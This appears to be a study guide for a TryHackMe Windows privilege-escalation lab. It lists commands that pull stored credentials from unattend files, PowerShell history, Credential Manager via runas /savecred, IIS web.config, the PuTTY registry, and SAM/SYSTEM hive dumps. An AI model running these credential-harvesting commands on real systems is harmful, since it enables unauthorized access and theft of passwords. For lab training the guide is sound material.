# Windows Privilege Escalation – Credential Hunting Guide

This document summarizes all the key techniques for retrieving passwords and stored credentials from a Windows machine during a privilege escalation exercise (THM Windows PrivEsc Room – Tasks 3–5).

---

## 🔹 1. Unattended Windows Installations

Large-scale Windows deployments often rely on **unattended installation files**.
These files commonly store **admin usernames and cleartext passwords** used during installation.

### 📁 Locations to Check

```
C:\Unattend.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\system32\sysprep.inf
C:\Windows\system32\sysprep\sysprep.xml
```

### 📌 Example Credential Block

```xml
<Credentials>
    <Username>Administrator</Username>
    <Domain>thm.local</Domain>
    <Password>MyPassword123</Password>
</Credentials>
```

Use `type` to inspect the files:

```
type C:\Unattend.xml
type C:\Windows\Panther\Unattend.xml
```

---

## 🔹 2. PowerShell History

PowerShell stores command history locally.
If a user ran a command containing **passwords**, they can be retrieved.

### 📁 History File Location

```
%userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

### 📌 From CMD:

```
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

### 📌 From PowerShell:

```
type "$Env:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt"
```

Look for revealing commands like:

* `net use \\share /user:admin password`
* Scripts containing passwords
* `ConvertTo-SecureString` usage with plaintext

---

## 🔹 3. Saved Windows Credentials (Credential Manager)

Windows stores credentials for RDP, SMB, shared drives, etc.
These can be enumerated using `cmdkey`.

### 📌 List Saved Credentials

```
cmdkey /list
```

You may find entries like:

```
Target: Domain:admin
```

### 🚀 Use Saved Credentials with `runas`

```
runas /savecred /user:admin cmd.exe
```

Even without knowing the password, Windows uses the stored credentials.

---

## 🔹 4. IIS Configuration Files (web.config)

IIS often stores **database credentials**, API keys, or authentication settings.

### 📁 Common Locations

```
C:\inetpub\wwwroot\web.config
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
```

### 🔍 Search for Database Strings

```
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
```

Example:

```
connectionString="Server=.;Database=Test;User ID=sa;Password=P@ssw0rd"
```

---

## 🔹 5. PuTTY Stored Credentials (Registry)

PuTTY stores session configuration including **proxy credentials** in cleartext.

### 📌 Enumerate Stored Sessions

```
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
```

Look for:

```
ProxyUsername    REG_SZ    admin
ProxyPassword    REG_SZ    myplaintextpassword
```

These credentials can be reused for:

* Proxy authentication
* SSH pivoting
* Trying local admin login

---

## 🔹 Additional Recommended Checks

### 🔎 Search for Passwords in Files

```
findstr /si password *.txt *.xml *.ini *.config *.cfg
```

### 🔎 Saved Browser Credentials

Use NirSoft tools (if allowed in CTF):

* WebBrowserPassView
* NetworkCredentialsView

### 🔎 Dump SAM & SYSTEM (if perms allow)

```
reg save hklm\sam sam.hive
reg save hklm\system system.hive
```

Crack offline using `samdump2` or `secretsdump.py`.

---

## ✔ Summary Checklist

| Technique              | What You Get                            |
| ---------------------- | --------------------------------------- |
| Unattended XML/Sysprep | Plaintext admin credentials             |
| PowerShell History     | Commands containing plaintext passwords |
| cmdkey / runas         | Saved Windows credentials               |
| IIS web.config         | DB credentials, app secrets             |
| PuTTY registry         | Proxy username/password                 |
| File search            | Config file credentials                 |
| SAM dump               | NTLM hashes                             |


